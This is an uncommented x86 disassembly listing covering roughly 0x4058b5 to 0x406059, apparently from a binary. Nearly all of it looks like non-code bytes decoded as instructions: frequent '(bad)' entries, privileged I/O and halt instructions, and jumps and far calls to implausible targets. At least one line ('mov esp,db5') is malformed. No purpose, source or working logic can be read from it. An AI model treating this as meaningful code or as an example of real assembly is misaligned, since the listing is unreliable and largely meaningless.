  4058b5:	inc    ecx
  4058b6:	fist   WORD PTR [eax-0x60]
  4058b9:	test   DWORD PTR ds:0x5307998c,edx
  4058bf:	loope  0x4058b6
  4058c1:	imul   ebp,DWORD PTR [esi+eiz*8],0x30
  4058c5:	into   
  4058c6:	adc    DWORD PTR [edx],0x4
  4058c9:	inc    ebx
  4058ca:	and    DWORD PTR [ebp+0x27],ebp
  4058cd:	fdivr  DWORD PTR [edx-0x365c961c]
  4058d3:	xchg   ecx,eax
  4058d4:	enter  0x9e7f,0x65
  4058d8:	stos   BYTE PTR es:[edi],al
  4058d9:	aaa    
  4058da:	mov    bl,0xcd
  4058dc:	jle    0x40587b
  4058de:	jne    0x4058de
  4058e0:	dec    ebp
  4058e1:	mov    gs,WORD PTR [ebp+0x79]
  4058e4:	add    al,0x3c
  4058e6:	ror    DWORD PTR gs:0x684408aa,1
  4058ed:	popa   
  4058ee:	sbb    BYTE PTR [ecx-0xbbe730c],dh
  4058f4:	ret    0x6b2
  4058f7:	ret    0xfd56
  4058fa:	call   0x827f8cab
  4058ff:	xchg   ebx,eax
  405900:	dec    eax
  405901:	fcomp  QWORD PTR [ebx-0x15]
  405904:	cli    
  405905:	stos   DWORD PTR es:[edi],eax
  405906:	sbb    eax,0xe1869caf
  40590b:	mov    DWORD PTR [eax+0x7f],esp
  40590e:	cld    
  40590f:	add    dh,BYTE PTR [ecx+0x68]
  405912:	xlat   BYTE PTR ds:[ebx]
  405913:	lock sti 
  405915:	xor    ecx,ebp
  405917:	mov    al,0xca
  405919:	data16 (bad) 
  40591b:	lock adc dl,BYTE PTR [esp+eiz*2-0x49]
  405920:	retf   0x3aa4
  405923:	data16 lods al,BYTE PTR ds:[esi]
  405925:	ss (bad) 
  405927:	in     al,0xa0
  405929:	test   al,0xe4
  40592b:	mov    eax,fs:0x5a3d993e
  405931:	adc    edx,DWORD PTR [ebx-0x3c5ae3b7]
  405937:	jmp    0x405941
  405939:	pusha  
  40593a:	add    BYTE PTR [ebx],al
  40593c:	dec    edx
  40593d:	and    ebp,ebp
  40593f:	gs dec ebp
  405941:	mov    bl,bl
  405943:	fbstp  TBYTE PTR [eax+0x58]
  405946:	push   0x22
  405948:	popa   
  405949:	push   0x451aa614
  40594e:	pop    edx
  40594f:	sub    BYTE PTR [ecx+ecx*4+0x6e03d589],dh
  405956:	pop    es
  405957:	mov    ah,0x2a
  405959:	test   ah,cl
  40595b:	in     al,0x76
  40595d:	dec    esp
  40595e:	pop    ds
  40595f:	and    eax,0xf4d29055
  405964:	mov    ds:0x60c4d3e3,al
  405969:	mov    ebp,0x8697e89
  40596e:	dec    ebx
  40596f:	stos   DWORD PTR es:[edi],eax
  405970:	xchg   edx,eax
  405971:	cmp    BYTE PTR [ebx+0x78],0x8b
  405975:	add    ebp,DWORD PTR [esi-0x79fc2fc2]
  40597b:	pop    ebp
  40597c:	into   
  40597d:	retf   0xa628
  405980:	jnp    0x4059f2
  405982:	(bad)  
  405983:	xor    DWORD PTR [eax+0x3ca8f06a],ebp
  405989:	sbb    al,0xb7
  40598b:	sub    DWORD PTR [esi],edx
  40598d:	jmp    0x405984
  40598f:	arpl   di,cx
  405991:	out    0x9,eax
  405993:	sub    ecx,edi
  405995:	outs   dx,DWORD PTR cs:[esi]
  405997:	sbb    ebx,DWORD PTR [edx-0x43]
  40599a:	std    
  40599b:	ss call 0x62dd:0xeb5d7bc7
  4059a3:	jno    0x4059c2
  4059a5:	push   eax
  4059a6:	ror    BYTE PTR [ebx*2-0xafd4b50],0xe4
  4059ae:	clc    
  4059af:	aaa    
  4059b0:	sub    ch,bh
  4059b2:	and    bh,ch
  4059b4:	(bad)  
  4059b5:	ret    
  4059b6:	cmp    ecx,DWORD PTR [ebp-0x36e56a63]
  4059bc:	inc    eax
  4059bd:	jmp    0xfee9e07b
  4059c2:	or     eax,0xeef09bad
  4059c7:	xor    ah,0xbb
  4059ca:	ret    0x2ee
  4059cd:	out    dx,al
  4059ce:	jle    0x4059dd
  4059d0:	cmp    esi,esp
  4059d2:	push   cs
  4059d3:	fidivr DWORD PTR [esi+0x3b45155]
  4059d9:	xor    eax,esp
  4059db:	xchg   ebx,eax
  4059dc:	into   
  4059dd:	repz pop ebp
  4059df:	retf   0xb706
  4059e2:	fstp   TBYTE PTR [ebx]
  4059e4:	int3   
  4059e5:	mov    al,0x6b
  4059e7:	mov    eax,0x40aa7c40
  4059ec:	push   eax
  4059ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059ef:	sti    
  4059f0:	pop    ecx
  4059f1:	add    esi,DWORD PTR [ebp+0x10]
  4059f4:	cmp    edx,esi
  4059f6:	jbe    0x4050e3
  4059fc:	pop    ebx
  4059fd:	mov    eax,0xf89c8539
  405a02:	pop    edi
  405a03:	pop    esi
  405a04:	leave  
  405a05:	ret    0xc
  405a08:	push   ebp
  405a09:	mov    ebp,esp
  405a0b:	mov    eax,DWORD PTR [ebp+0xc]
  405a0e:	jmp    0x405cfe
  405a13:	cmp    eax,0xd4d7d0c1
  405a18:	fnstcw WORD PTR ds:0xbbc9f8d9
  405a1e:	jecxz  0x405a6f
  405a20:	push   edi
  405a21:	jo     0x405a41
  405a23:	cmp    BYTE PTR [bx+si+0x78],bh
  405a27:	dec    ebp
  405a28:	jle    0x405aa2
  405a2a:	js     0x4059ad
  405a2c:	cld    
  405a2d:	pop    eax
  405a2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a2f:	push   0xffffff9d
  405a31:	in     eax,0xe9
  405a33:	inc    eax
  405a34:	sti    
  405a35:	aaa    
  405a36:	(bad)  
  405a37:	(bad)  
  405a38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a39:	addr16 push edx
  405a3b:	jo     0x405a83
  405a3d:	sar    DWORD PTR [esi-0x7d],0x5b
  405a41:	jge    0x405a5b
  405a43:	fs out 0x34,al
  405a46:	(bad)  
  405a47:	lock and al,0x37
  405a4a:	xchg   esp,eax
  405a4b:	mov    ebx,0x6e309884
  405a50:	int3   
  405a51:	push   ds
  405a52:	fstp   DWORD PTR [ebx]
  405a54:	(bad)  
  405a55:	jns    0x4059d9
  405a57:	addr16 mov ebx,0x1a2c6264
  405a5d:	fsubr  QWORD PTR [eax-0x4e]
  405a60:	pushf  
  405a61:	xchg   esp,eax
  405a62:	pop    ds
  405a63:	dec    ebx
  405a64:	inc    esi
  405a65:	dec    ebp
  405a66:	jo     0x405a23
  405a68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a69:	adc    dl,al
  405a6b:	mov    BYTE PTR ds:[ecx],dh
  405a6e:	test   al,0xce
  405a70:	mov    edi,0xdffecc2b
  405a75:	or     eax,0xe2d77e57
  405a7a:	xchg   dl,ch
  405a7c:	pop    ss
  405a7d:	icebp  
  405a7e:	mov    cs,WORD PTR [ecx+ecx*8]
  405a81:	fisttp DWORD PTR [esi+eiz*1+0x62]
  405a85:	inc    ecx
  405a86:	loopne 0x405a4c
  405a88:	pusha  
  405a89:	mov    esi,0x4900e4f
  405a8e:	(bad)  
  405a8f:	outs   dx,DWORD PTR ds:[esi]
  405a90:	add    edi,ecx
  405a92:	mov    ah,0xe9
  405a94:	jl     0x405a90
  405a96:	pusha  
  405a97:	fs arpl dx,cx
  405a9a:	iret   
  405a9b:	mov    DWORD PTR [esi-0x65],eax
  405a9e:	xor    eax,0xac563d0c
  405aa3:	dec    BYTE PTR [edx-0x1373851e]
  405aa9:	aaa    
  405aaa:	shl    DWORD PTR [eax],1
  405aac:	add    al,0xbf
  405aae:	lods   al,BYTE PTR ds:[esi]
  405aaf:	add    edx,DWORD PTR [ebp+0x73]
  405ab2:	and    dl,ah
  405ab4:	add    BYTE PTR [ecx],0xd9
  405ab7:	ins    DWORD PTR es:[edi],dx
  405ab8:	mov    esi,0x30d836ae
  405abd:	sub    ebx,DWORD PTR [eax+0x482e9294]
  405ac3:	aaa    
  405ac4:	pop    ss
  405ac5:	mov    al,0xc
  405ac7:	cmp    BYTE PTR [esp+esi*8],0x11
  405acb:	leave  
  405acc:	cmp    esp,DWORD PTR [ecx+0x63]
  405acf:	fild   QWORD PTR [ecx]
  405ad1:	xchg   edx,eax
  405ad2:	mov    eax,0xf0da5114
  405ad7:	das    
  405ad8:	mov    ah,0x2a
  405ada:	jp     0x405b24
  405adc:	loope  0x405aab
  405ade:	inc    ecx
  405adf:	mov    bh,0x0
  405ae1:	fild   QWORD PTR [ebx-0x1b0b9c7f]
  405ae7:	dec    edi
  405ae8:	dec    edi
  405ae9:	dec    edi
  405aea:	shr    edx,1
  405aec:	dec    eax
  405aed:	push   ebx
  405aee:	mov    esp,0x79509360
  405af3:	(bad)  
  405af4:	test   eax,0x437877df
  405af9:	pop    ss
  405afa:	sti    
  405afb:	call   FWORD PTR [esi+0x6f]
  405afe:	inc    eax
  405aff:	dec    ecx
  405b00:	ss leave 
  405b02:	jbe    0x405b17
  405b04:	mov    gs,WORD PTR [ebp+0x4d]
  405b07:	sbb    BYTE PTR [edi-0x1ed1c776],ch
  405b0d:	cld    
  405b0e:	and    cl,BYTE PTR [eax+ebx*8+0x63fcea93]
  405b15:	sbb    al,0xc1
  405b17:	xchg   ebp,eax
  405b18:	icebp  
  405b19:	test   BYTE PTR [ecx-0x25a39cae],cl
  405b1f:	xchg   ebx,eax
  405b20:	dec    ecx
  405b21:	repz jmp 0x405ab6
  405b24:	aam    0xc8
  405b26:	pop    esi
  405b27:	retf   0x4134
  405b2a:	outs   dx,DWORD PTR ds:[esi]
  405b2b:	xor    al,0x94
  405b2d:	aas    
  405b2e:	adc    esp,DWORD PTR [eax+edx*1-0xadf2e0]
  405b35:	pop    esp
  405b36:	sub    cl,BYTE PTR [edx]
  405b38:	pop    ebx
  405b39:	ror    bl,1
  405b3b:	sbb    dh,BYTE PTR [esi]
  405b3d:	adc    eax,0xe265d3bb
  405b42:	sub    DWORD PTR [edi],edx
  405b44:	lods   al,BYTE PTR ds:[esi]
  405b45:	mov    bl,0x31
  405b47:	test   BYTE PTR [esi],bh
  405b49:	or     esp,DWORD PTR [ebp-0x22]
  405b4c:	ins    BYTE PTR es:[edi],dx
  405b4d:	and    dl,dh
  405b4f:	pop    esi
  405b50:	das    
  405b51:	ins    BYTE PTR es:[edi],dx
  405b52:	jle    0x405b42
  405b54:	aad    0xbf
  405b56:	fld    TBYTE PTR [esi+0x2]
  405b59:	adc    ecx,edx
  405b5b:	(bad)  
  405b5c:	stc    
  405b5d:	and    eax,0xed573e52
  405b62:	cld    
  405b63:	pop    eax
  405b64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b65:	sbb    al,0x3b
  405b67:	fwait
  405b68:	cld    
  405b69:	push   esi
  405b6a:	shl    bh,cl
  405b6c:	push   ecx
  405b6d:	pop    ecx
  405b6e:	and    DWORD PTR ds:0xb9e0f993,edi
  405b74:	sbb    BYTE PTR [eax-0x7e],bl
  405b77:	push   ebx
  405b78:	or     eax,0x250d0bd9
  405b7d:	and    al,0x44
  405b7f:	or     BYTE PTR [ecx+0x10af2daa],bh
  405b85:	xchg   ebp,eax
  405b86:	cld    
  405b87:	inc    eax
  405b88:	jns    0x405ba4
  405b8a:	sub    DWORD PTR [ecx+0x65],edx
  405b8d:	add    BYTE PTR [edi],dh
  405b8f:	inc    edx
  405b90:	enter  0x73d1,0x8d
  405b94:	ins    BYTE PTR es:[edi],dx
  405b95:	xchg   ebx,eax
  405b96:	xor    eax,DWORD PTR [esi+0x32589b2d]
  405b9c:	lock add BYTE PTR [esi-0x7],ah
  405ba0:	sbb    BYTE PTR [edi-0x634ff650],0x7
  405ba7:	pop    eax
  405ba8:	data16 and ah,BYTE PTR [ebx+0x33e4e304]
  405baf:	fsubrp st(5),st
  405bb1:	xor    BYTE PTR [edx],ah
  405bb3:	retf   0x761a
  405bb6:	dec    ecx
  405bb7:	rcl    edx,0x8a
  405bba:	dec    esi
  405bbb:	jge    0x405bb4
  405bbd:	cwde   
  405bbe:	fistp  QWORD PTR [ecx*2+0x586d7f88]
  405bc5:	pushf  
  405bc6:	pop    esi
  405bc7:	push   ebp
  405bc8:	mov    edx,0x19d2750e
  405bcd:	add    cl,cl
  405bcf:	inc    edx
  405bd0:	aam    0x86
  405bd2:	pop    esp
  405bd3:	hlt    
  405bd4:	dec    ebp
  405bd5:	xor    al,0xc8
  405bd7:	ret    
  405bd8:	mov    bl,0x9
  405bda:	mov    ds:0xcbc85bb3,eax
  405bdf:	aam    0xff
  405be1:	jmp    0x63fe1ee7
  405be6:	mov    edi,0x601b329f
  405beb:	push   eax
  405bec:	stos   DWORD PTR es:[edi],eax
  405bed:	xor    dl,0x0
  405bf0:	in     eax,dx
  405bf1:	hlt    
  405bf2:	or     DWORD PTR [ecx],esp
  405bf4:	sub    dh,dl
  405bf6:	inc    edi
  405bf7:	sbb    DWORD PTR [eax+0x57],eax
  405bfa:	pushf  
  405bfb:	inc    esi
  405bfc:	sbb    al,0x68
  405bfe:	and    al,0x46
  405c00:	lea    edx,[ebx+0xb]
  405c03:	pop    ecx
  405c04:	pop    ss
  405c05:	lea    esi,[ebx-0x318747a2]
  405c0b:	test   al,0xfe
  405c0d:	into   
  405c0e:	mov    esp,0xd69fad16
  405c13:	test   al,0x50
  405c15:	push   es
  405c16:	xor    al,0x2a
  405c18:	leave  
  405c19:	dec    esi
  405c1a:	jae    0x405bf1
  405c1c:	sub    bh,al
  405c1e:	lock and ecx,DWORD PTR [edi]
  405c21:	push   es
  405c22:	pop    es
  405c23:	stc    
  405c24:	rol    BYTE PTR [ebx],1
  405c26:	mov    eax,ds:0xbbd243d6
  405c2b:	fcom   st(0)
  405c2d:	xor    edx,DWORD PTR [edx-0x73]
  405c30:	iret   
  405c31:	mov    gs,WORD PTR [esi-0x1ffad93b]
  405c37:	lods   al,BYTE PTR ds:[esi]
  405c38:	and    BYTE PTR ds:[ebx],dh
  405c3b:	sbb    ch,bl
  405c3d:	add    ebp,DWORD PTR [esi+eax*1-0xf3394bd]
  405c44:	ins    DWORD PTR es:[edi],dx
  405c45:	stos   BYTE PTR es:[edi],al
  405c46:	xchg   edx,eax
  405c47:	popa   
  405c48:	xchg   ecx,eax
  405c49:	jge    0x405c63
  405c4b:	ins    BYTE PTR es:[edi],dx
  405c4c:	ins    DWORD PTR es:[edi],dx
  405c4d:	clc    
  405c4e:	jmp    FWORD PTR [eax]
  405c50:	mov    edx,0x7d93abaf
  405c55:	aad    0xb4
  405c57:	scas   eax,DWORD PTR es:[edi]
  405c58:	jge    0x405cd8
  405c5a:	stos   BYTE PTR es:[edi],al
  405c5b:	add    al,0x4d
  405c5d:	in     al,0x1
  405c5f:	push   edx
  405c60:	call   0x8c277588
  405c65:	adc    esi,DWORD PTR [edi+0x28]
  405c68:	icebp  
  405c69:	mov    eax,0xc1da5158
  405c6e:	in     al,0xff
  405c70:	iret   
  405c71:	adc    dh,ah
  405c73:	mov    dl,0x4a
  405c75:	les    ebx,FWORD PTR [esi+0x66]
  405c78:	jo     0x405cc7
  405c7a:	jne    0x405c51
  405c7c:	jbe    0x405c40
  405c7e:	dec    esi
  405c7f:	sbb    al,ah
  405c81:	adc    ch,dh
  405c83:	xor    al,0xab
  405c85:	push   ecx
  405c86:	mov    DWORD PTR ds:0xaa799765,esp
  405c8c:	dec    esp
  405c8d:	cdq    
  405c8e:	dec    ebx
  405c8f:	aas    
  405c90:	das    
  405c91:	test   DWORD PTR [edi],eax
  405c93:	jo     0x405d0a
  405c95:	in     al,dx
  405c96:	pop    esi
  405c97:	push   0xf
  405c99:	sub    dl,BYTE PTR [esi-0x38731542]
  405c9f:	add    BYTE PTR [eax-0x3b],bl
  405ca2:	push   ebp
  405ca3:	pop    ss
  405ca4:	aad    0xd0
  405ca6:	stc    
  405ca7:	addr16 mov eax,0x57442edb
  405cad:	dec    ebp
  405cae:	into   
  405caf:	call   0xfc4b:0x910371cf
  405cb6:	jg     0x405c7a
  405cb8:	cdq    
  405cb9:	xor    eax,0xb16a4592
  405cbe:	in     al,dx
  405cbf:	fild   DWORD PTR [esi+0x46]
  405cc2:	mov    esi,0x712f3b4b
  405cc7:	pop    eax
  405cc8:	sar    BYTE PTR [ecx-0x58],0x75
  405ccc:	jmp    0x405c91
  405cce:	rol    DWORD PTR [eax],1
  405cd0:	aas    
  405cd1:	jl     0x405c66
  405cd3:	data16 js 0x405c7c
  405cd6:	xor    ch,BYTE PTR [eax-0x2fd08c9b]
  405cdc:	dec    esi
  405cdd:	fwait
  405cde:	xchg   BYTE PTR [eax-0x79],al
  405ce1:	retf   0x1895
  405ce4:	test   al,0x76
  405ce6:	ins    BYTE PTR es:[edi],dx
  405ce7:	add    ebp,DWORD PTR [ebx-0x5f50643]
  405ced:	mov    eax,ds:0xa1709408
  405cf2:	clc    
  405cf3:	ret    
  405cf4:	sahf   
  405cf5:	mov    esi,0xe002757a
  405cfa:	sub    ebx,esp
  405cfc:	sub    DWORD PTR [ebx+esi*1-0x2e],esi
  405d00:	jmp    0x405ff0
  405d05:	rol    ebx,1
  405d07:	ror    cl,0xd6
  405d0a:	leave  
  405d0b:	rcr    ebx,1
  405d0d:	aaa    
  405d0e:	mov    eax,0x13504c09
  405d13:	adc    ecx,DWORD PTR [edx-0x4c]
  405d16:	cmp    eax,0x7e4d7878
  405d1b:	js     0x405d95
  405d1d:	(bad)  
  405d20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d21:	push   ecx
  405d22:	adc    eax,0x31a38704
  405d27:	sub    al,0xbc
  405d29:	loope  0x405d6a
  405d2b:	xchg   ebp,eax
  405d2c:	adc    al,ch
  405d2e:	in     al,0xbf
  405d30:	mov    bh,0x43
  405d32:	xchg   ecx,eax
  405d33:	ret    
  405d34:	(bad)  
  405d35:	gs inc edx
  405d37:	js     0x405d8d
  405d39:	retf   0x9488
  405d3c:	pop    ss
  405d3d:	add    cl,BYTE PTR [edi+0x129b47ee]
  405d43:	cld    
  405d44:	adc    eax,0xeb4134de
  405d49:	inc    eax
  405d4a:	cwde   
  405d4b:	inc    ebx
  405d4c:	inc    eax
  405d4d:	leave  
  405d4e:	shl    BYTE PTR [esi+0x508de542],1
  405d54:	mov    ds:0x73356f4b,al
  405d59:	repnz lds esp,FWORD PTR [ebx-0x3b]
  405d5d:	push   ss
  405d5e:	aad    0xa8
  405d60:	jo     0x405d2e
  405d62:	into   
  405d63:	fwait
  405d64:	aad    0x96
  405d66:	dec    esp
  405d67:	inc    ecx
  405d68:	pop    ss
  405d69:	inc    edx
  405d6a:	fs aaa 
  405d6c:	clc    
  405d6d:	fadd   DWORD PTR [edi+ecx*1]
  405d70:	cmp    eax,0xe76ae0bd
  405d75:	push   ss
  405d76:	(bad)  
  405d77:	push   ebx
  405d78:	inc    edi
  405d79:	ret    0xeeb2
  405d7c:	(bad)  
  405d7d:	xchg   ebp,eax
  405d7e:	dec    edx
  405d7f:	lahf   
  405d80:	stos   DWORD PTR es:[edi],eax
  405d81:	mov    esp,db5
  405d84:	jp     0x405d75
  405d86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d87:	in     eax,dx
  405d88:	mov    ch,0x92
  405d8a:	loope  0x405d11
  405d8c:	inc    ecx
  405d8d:	rcr    dl,0x6a
  405d90:	sub    eax,0x6df711eb
  405d95:	test   al,0xec
  405d97:	lahf   
  405d98:	pop    edx
  405d99:	xor    ecx,DWORD PTR [edi+0x1a]
  405d9c:	in     eax,0x2c
  405d9e:	out    dx,al
  405d9f:	adc    eax,DWORD PTR [edx+ebx*2]
  405da2:	fprem  
  405da4:	fcomp  QWORD PTR ds:0x874b2fff
  405daa:	jge    0x405d55
  405dac:	add    al,0x92
  405dae:	pop    ss
  405daf:	xchg   esp,eax
  405db0:	loope  0x405d6a
  405db2:	cwde   
  405db3:	mov    esi,0x3b11a0f4
  405db8:	inc    eax
  405db9:	(bad)  
  405dba:	sbb    al,0x80
  405dbc:	dec    ebx
  405dbd:	inc    ebp
  405dbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405dbf:	pop    ds
  405dc0:	sub    al,0xbf
  405dc2:	inc    ebp
  405dc3:	xor    eax,0x6aebba18
  405dc8:	xor    eax,0xedab101
  405dcd:	aam    0x85
  405dcf:	loop   0x405d80
  405dd1:	pusha  
  405dd2:	aaa    
  405dd3:	mov    sp,0x2d69
  405dd7:	dec    edx
  405dd8:	adc    BYTE PTR [edi-0x7c],al
  405ddb:	cmp    al,0xef
  405ddd:	loopne 0x405e5b
  405ddf:	ja     0x405dbc
  405de1:	mov    eax,0x7f489387
  405de6:	sbb    edx,DWORD PTR gs:[edx+0x5]
  405dea:	adc    eax,DWORD PTR [edi-0x59a6888f]
  405df0:	dec    esi
  405df1:	and    al,0xff
  405df3:	(bad)  
  405df5:	adc    BYTE PTR ds:0x37ddceec,0x9d
  405dfc:	adc    DWORD PTR [edi+0x184921e6],0xffffffbc
  405e03:	ror    edi,cl
  405e05:	hlt    
  405e06:	push   eax
  405e07:	in     eax,0x13
  405e09:	pop    edi
  405e0a:	push   esi
  405e0b:	dec    edx
  405e0c:	sahf   
  405e0d:	cmp    eax,0x4fce306a
  405e12:	pop    edi
  405e13:	cmp    al,0xb4
  405e15:	add    ebx,0x66
  405e18:	push   ds
  405e19:	push   ecx
  405e1a:	and    dl,0x7c
  405e1d:	adc    cl,BYTE PTR [ecx-0x3f]
  405e20:	lods   eax,DWORD PTR ds:[esi]
  405e21:	push   0x16d11baf
  405e26:	or     DWORD PTR [edx-0x52],0xf376359e
  405e2d:	addr16 push esp
  405e2f:	adc    al,0x6b
  405e31:	sub    DWORD PTR [esi+0x23b7e3d4],ebx
  405e37:	push   es
  405e38:	sbb    eax,0xa56b9a2e
  405e3d:	inc    eax
  405e3e:	loop   0x405e46
  405e40:	xchg   al,dl
  405e42:	pop    edx
  405e43:	sahf   
  405e44:	nop
  405e45:	sti    
  405e46:	jnp    0x405e11
  405e48:	dec    BYTE PTR [ebp+esi*8+0x1c]
  405e4c:	inc    ebx
  405e4d:	sub    BYTE PTR [edi],cl
  405e4f:	imul   esi,DWORD PTR ds:0x2d71854,0xa711eda0
  405e59:	pop    ss
  405e5a:	xchg   esp,eax
  405e5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e5c:	icebp  
  405e5d:	and    eax,0xff341378
  405e62:	pop    edx
  405e63:	mov    DWORD PTR [esi+0x10aa4276],edi
  405e69:	mov    dl,0xe
  405e6b:	cmp    eax,0xd5e167de
  405e70:	bound  edi,QWORD PTR [ecx]
  405e72:	xor    al,0x77
  405e74:	enter  0x5df3,0x21
  405e78:	es sub eax,0xbe13dbaa
  405e7e:	arpl   WORD PTR [esi+ecx*8-0x4c],cx
  405e82:	(bad)  
  405e83:	retf   
  405e84:	fistp  DWORD PTR [ecx]
  405e86:	fidivr WORD PTR [ebx-0x43824ecd]
  405e8c:	or     al,bl
  405e8e:	aaa    
  405e8f:	jae    0x405ec0
  405e91:	mov    al,BYTE PTR [esi]
  405e93:	cmp    eax,0xd26127be
  405e98:	adc    DWORD PTR [edx],0xffffffe7
  405e9b:	jl     0x405e93
  405e9d:	pusha  
  405e9e:	sbb    DWORD PTR [ebp+0x3ae747ce],esi
  405ea4:	les    esi,FWORD PTR [edi-0x5b00e11a]
  405eaa:	pop    ds
  405eab:	not    ch
  405ead:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405eae:	add    eax,0xd33134b4
  405eb3:	or     al,0xeb
  405eb5:	sbb    eax,0xa3140af3
  405eba:	cmp    ecx,DWORD PTR [ebp+0xee4b325]
  405ec0:	add    bl,bh
  405ec2:	xchg   BYTE PTR [ebx+0x47],ch
  405ec5:	scas   al,BYTE PTR es:[edi]
  405ec6:	pop    edx
  405ec7:	mov    dh,0xb4
  405ec9:	mov    al,ds:0xc19c9d99
  405ece:	jno    0x405f0f
  405ed0:	mov    esp,0xcfe4ab0e
  405ed5:	sar    ebp,0x19
  405ed8:	or     eax,DWORD PTR [eax-0x2fc5104b]
  405ede:	retf   
  405edf:	cs jo  0x405ed7
  405ee2:	xchg   BYTE PTR cs:[esi+0x6b],bl
  405ee6:	adc    al,BYTE PTR [edi+ecx*8-0x66ab3471]
  405eed:	es stc 
  405eef:	mov    eax,0x1015b500
  405ef4:	pushf  
  405ef5:	and    DWORD PTR [ecx+ecx*8+0x5c],ebp
  405ef9:	jle    0x405f6e
  405efb:	int3   
  405efc:	in     al,dx
  405efd:	adc    ah,BYTE PTR [esi+0x6f0d2dea]
  405f03:	xchg   edi,eax
  405f04:	xor    edi,DWORD PTR [edx+0x19]
  405f07:	in     eax,0xd0
  405f09:	dec    edi
  405f0a:	mov    ds:0x8a457db9,eax
  405f0f:	dec    edx
  405f10:	stos   DWORD PTR es:[edi],eax
  405f11:	daa    
  405f12:	dec    edx
  405f13:	inc    edx
  405f14:	retf   0x4a16
  405f17:	iret   
  405f18:	mov    bl,0x96
  405f1a:	dec    ebp
  405f1b:	stos   DWORD PTR es:[edi],eax
  405f1c:	cmp    ah,BYTE PTR [edi]
  405f1e:	jl     0x405eb3
  405f20:	jo     0x405ebd
  405f22:	cmp    esi,esi
  405f24:	inc    ebp
  405f25:	or     cl,BYTE PTR [edi]
  405f27:	fisttp QWORD PTR [edi+0x64b3ac2a]
  405f2d:	pop    esi
  405f2e:	pushf  
  405f2f:	pop    edi
  405f30:	xlat   BYTE PTR ds:[ebx]
  405f31:	enter  0xe8d,0xc2
  405f35:	sar    esi,1
  405f37:	in     al,dx
  405f38:	ins    BYTE PTR es:[edi],dx
  405f39:	sub    BYTE PTR [ebx+0x14887618],dh
  405f3f:	mov    DWORD PTR [ebx],esp
  405f41:	mov    BYTE PTR [ebp+0x11],0xd9
  405f45:	mov    BYTE PTR [edi],al
  405f47:	es clc 
  405f49:	rcr    bl,1
  405f4b:	gs out dx,al
  405f4d:	sbb    al,BYTE PTR [edi+eiz*4+0x4a]
  405f51:	mov    bh,0x75
  405f53:	sbb    DWORD PTR [edx],esi
  405f55:	int3   
  405f56:	scas   al,BYTE PTR es:[edi]
  405f57:	pop    eax
  405f58:	or     eax,0xfdc6ba96
  405f5d:	pop    eax
  405f5e:	ficom  WORD PTR [ebp+0x3e]
  405f61:	push   edi
  405f62:	stos   DWORD PTR es:[edi],eax
  405f63:	call   0xa3c0:0xdeb37dc0
  405f6a:	aas    
  405f6b:	adc    bl,al
  405f6d:	nop
  405f6e:	or     ebx,ecx
  405f70:	shr    DWORD PTR ds:0x951975f2,cl
  405f76:	repnz xchg ebx,eax
  405f78:	inc    ebp
  405f79:	in     al,0x1
  405f7b:	xchg   ebp,eax
  405f7c:	ja     0x405f34
  405f7e:	add    BYTE PTR [ebx],dl
  405f80:	inc    eax
  405f81:	cdq    
  405f82:	sbb    DWORD PTR [edx+edi*2+0x46389d93],edx
  405f89:	jmp    0x235b95d5
  405f8e:	mov    edi,0x45f7aa7b
  405f93:	iret   
  405f94:	pop    ebx
  405f95:	mov    esi,0xcd987b8d
  405f9a:	jge    0x405f6b
  405f9c:	inc    DWORD PTR [edi+ebx*8+0x65]
  405fa0:	or     DWORD PTR ds:0x591dfb12,esi
  405fa6:	inc    ebx
  405fa7:	inc    esp
  405fa8:	addr16 jbe 0x405ff4
  405fab:	jae    0x406017
  405fad:	dec    ecx
  405fae:	pushf  
  405faf:	dec    eax
  405fb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fb1:	adc    eax,0x75c36d1a
  405fb6:	leave  
  405fb7:	and    al,0x14
  405fb9:	outs   dx,BYTE PTR ds:[esi]
  405fba:	xor    BYTE PTR [ecx+0x2c],0xf8
  405fbe:	pusha  
  405fbf:	in     al,dx
  405fc0:	stc    
  405fc1:	fwait
  405fc2:	pop    esp
  405fc3:	fwait
  405fc4:	ret    0xb803
  405fc7:	jmp    DWORD PTR [esi+0x2de2d0ea]
  405fcd:	int    0xfe
  405fcf:	push   ds
  405fd0:	das    
  405fd1:	adc    eax,0x1a058d63
  405fd6:	ret    0x3bcd
  405fd9:	jne    0x405fd7
  405fdb:	mov    ds:0x9fc6623c,eax
  405fe0:	enter  0xfae8,0xe9
  405fe4:	not    BYTE PTR [ecx+0x3087dab1]
  405fea:	mov    esi,0xbe75c7a6
  405fef:	sub    edi,DWORD PTR [ecx+0x7264fd50]
  405ff5:	jmp    0x4062e5
  405ffa:	iret   
  405ffb:	rcl    ebx,cl
  405ffd:	retf   
  405ffe:	ror    ebx,cl
  406000:	xlat   BYTE PTR ds:[ebx]
  406001:	(bad)  [ecx]
  406003:	lods   eax,DWORD PTR ds:[esi]
  406004:	and    al,0xa9
  406006:	push   0x89594ae0
  40600b:	ret    0x7878
  40600e:	dec    ebp
  40600f:	jle    0x406089
  406011:	js     0x406022
  406013:	add    al,0x96
  406015:	popa   
  406016:	mov    dl,0x6a
  406018:	sbb    eax,0x7027f3c1
  40601d:	adc    BYTE PTR [esp+eax*1],bl
  406020:	loope  0x406099
  406022:	jge    0x406007
  406024:	popf   
  406025:	push   cs
  406026:	add    ah,ch
  406028:	xor    BYTE PTR [edx-0x8],dl
  40602b:	stc    
  40602c:	mov    edi,0x585133df
  406031:	sahf   
  406032:	jp     0x40601d
  406034:	mov    esp,0xcd3829c7
  406039:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40603a:	mov    eax,ds:0xf30d374c
  40603f:	add    eax,0x87f3691e
  406044:	stc    
  406045:	(bad)
  40604a:	pop    es
  40604b:	cmp    edx,DWORD PTR [ecx-0x60c803a0]
  406051:	pop    ebx
  406052:	pop    ebp
  406053:	push   ds
  406054:	xor    eax,0xe9e2c052
  406059:	and    BYTE PTR [ebp+0x19],dh
